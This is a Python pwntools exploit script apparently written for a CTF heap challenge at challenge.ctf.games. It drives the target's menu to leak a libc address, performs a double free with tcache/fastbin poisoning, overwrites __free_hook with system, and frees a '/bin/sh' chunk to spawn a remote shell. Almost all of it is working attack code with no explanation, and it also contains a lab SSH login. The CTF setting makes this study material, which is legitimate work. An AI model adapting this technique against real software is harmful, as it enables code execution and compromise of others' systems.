from pwn import * # Import pwntools
####################
#### CONNECTION ####
####################
LOCAL = False
REMOTETTCP = True
REMOTESSH = False
GDB = False

LOCAL_BIN = './pawned_patched'
REMOTE_BIN = '~/vuln' #For ssh
LIBC = ELF('./libc.so.6') #Set library path when know it

if LOCAL:
    P = process(LOCAL_BIN) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTETTCP:
    P = remote('challenge.ctf.games',32670) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets

elif REMOTESSH:
    ssh_shell = ssh('bandit0', 'bandit.labs.overthewire.org', password='bandit0', port=2220)
    p = ssh_shell.process(REMOTE_BIN) # start the vuln binary
    elf = ELF(LOCAL_BIN)# Extract data from binary
    rop = ROP(elf)# Find ROP gadgets

if GDB and not REMOTETTCP and not REMOTESSH:
    # attach gdb and continue
    # You can set breakpoints, for example 'break *main'
    gdb.attach(P.pid,'')



##########################
##### OFFSET FINDER ######
##########################



#####################
#### Find Gadgets ###
#####################
try:
    libc_func = 'puts'
    PUTS_PLT = ELF_LOADED.plt['puts'] #PUTS_PLT = ELF_LOADED.symbols['puts'] # This is also valid to call puts
except:
    libc_func = 'printf'
    PUTS_PLT = ELF_LOADED.plt['printf']

MAIN_PLT = ELF_LOADED.symbols['main']
POP_RDI = (ROP_LOADED.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep 'pop rdi'
RET = (ROP_LOADED.find_gadget(['ret']))[0]

log.info('Main start: ' + hex(MAIN_PLT))
log.info('Puts plt: ' + hex(PUTS_PLT))
log.info('pop rdi; ret  gadget: ' + hex(POP_RDI))
log.info('ret gadget: ' + hex(RET))



##########################
##### FUNCTION ######
##########################

def add(page_size,name):
	P.sendlineafter(b'> ',b'S')
	P.sendlineafter(b'price: ',b'100')
	P.sendlineafter(b'Enter length',str(page_size))
	P.sendlineafter(b'Enter the name',name)
	print('Add 1 item with size ', page_size,'and content:',name.decode('ascii','ignore'))

def remove(page_index):
	P.sendlineafter(b'> ',b'B')
	P.sendlineafter(b'buy?: ',str(page_index))
	print('Remove page ', page_index)
	
def edit(page_index,page_size,name):
	P.sendlineafter(b'> ',b'M')
	P.sendlineafter(b'What item would you like to change?',str(page_index))
	P.sendlineafter(b'new item price:',b'100')
	P.sendlineafter(b'Enter the new item name length',str(page_size))
	P.sendlineafter(b'Enter the new name of the item',name)
	print('Edited page: ', page_index, ' with content: ',str(name))
	
def listen(page_index):
	P.sendlineafter(b'> ',b'P')
	P.recvuntil(str(page_index).encode())
	P.recvuntil(b'Name: ')
	recv = P.recvline().strip()
	return recv

def fillupTcache(size,from_index):
	for i in range(0,4):
		add(size,b'a')
	for i in range(0,4):
		remove(i+from_index)

##############################
##### FINAL EXPLOITATION #####
##############################

add(32,b'a') 	#index 1 
add(32,b'a')	#index 2
add(32,b'a')	#index 3
add(32,b'a')	#index 4
add(32,b'a')	#index 5
edit(1,1200,b'a')	#Tcache 0x30: 1
edit(2,1200,b'a')	#Tcache 0x30: 1
remove(1)		#Tcache 0x30: 2, leak libc here
leak = u64(listen(1).ljust(8,b'\x00'))
print(hex(leak))
LIBC.address = leak - 0x1ebbe0
free_hook = LIBC.sym['__free_hook']
system = LIBC.symbols['system']
remove(2)		#Tcache 0x30: 4
remove(3)		#Tcache 0x30: 6
edit(4,100,b'a')	#Tcache 0x30: 7
remove(5)
remove(5)		#double free here, fastbin: a<-b<-a
raw_input(1)
add(32,b'a')	#index 6, Tcache 0x30: 5
add(32,b'a')	#index 7, Tcache 0x30: 3
add(32,b'a')	#index 8, Tcache 0x30: 1
add(32,p64(free_hook))	#index 9, change a pointer to free_hook: b<-a<-free_hook
edit(4,32,b'/bin/sh')	#get b out
add(32,p64(system))	#index 10, change freehook to point to system
remove(4)		#call system(sh)

P.interactive()




